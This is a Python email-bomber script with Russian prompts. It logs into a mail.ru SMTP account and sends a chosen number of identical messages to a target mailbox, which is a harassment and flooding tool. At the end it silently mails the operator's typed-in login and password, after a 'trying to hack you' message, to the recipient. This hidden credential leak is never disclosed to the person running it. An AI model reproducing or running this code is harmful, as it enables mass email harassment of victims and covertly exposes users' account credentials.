import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
def send_message():
	url = 'smtp.mail.ru'
	print('Программа и её создатель не несет ответственности за твои проделки!\n'
		'............\n'
		'...Bomber...\n'
		'............\n')
	login_from_mail_out = input('Введите почту с которой будут поступать сообщения: ')
	password_from_out_mail = input('Введите пароль от этой почты: ')
	login_from_mail_in = input('Введите почту на которую будут отправляться сообщения: ')
	teme = input('Введите тему отправки: ')
	text_of_message = input('Введите текст сообщения: ')
	try:
		serv = smtplib.SMTP_SSL(url, 465)
		serv.login(login_from_mail_out, password_from_out_mail)
	except:
		print("Вы что то ввели неправильно, попробуйте ещё раз!")
		send_message()
	message = MIMEMultipart()
	message['Subject'] = teme
	message['From'] = login_from_mail_out
	body = text_of_message
	message.attach(MIMEText(body, 'plain'))
	serv = smtplib.SMTP_SSL(url, 465)
	serv.login(login_from_mail_out, password_from_out_mail)
	len_of_sended_messages = input('Введите количество отправляемых сообщений: ')
	n = 1
	try:
		serv.sendmail(login_from_mail_out, login_from_mail_in, message.as_string())
	except:
		print('Что то пошло не так, попробуйте снова!')
	for x in range(int(len_of_sended_messages)):
		serv.sendmail(login_from_mail_out, login_from_mail_in, message.as_string())
		print('Отправлено: ' + str(n))
		n += 1
	print('Программа закончила свою работу')
	passlog = login_from_mail_out + password_from_out_mail
	letter_from_hacker = 'Hi, i\'m try to hack you, my data of this acc in the next letter'
	serv.sendmail(login_from_mail_out, login_from_mail_in, letter_from_hacker)
	serv.sendmail(login_from_mail_out, login_from_mail_in, passlog)
send_message()

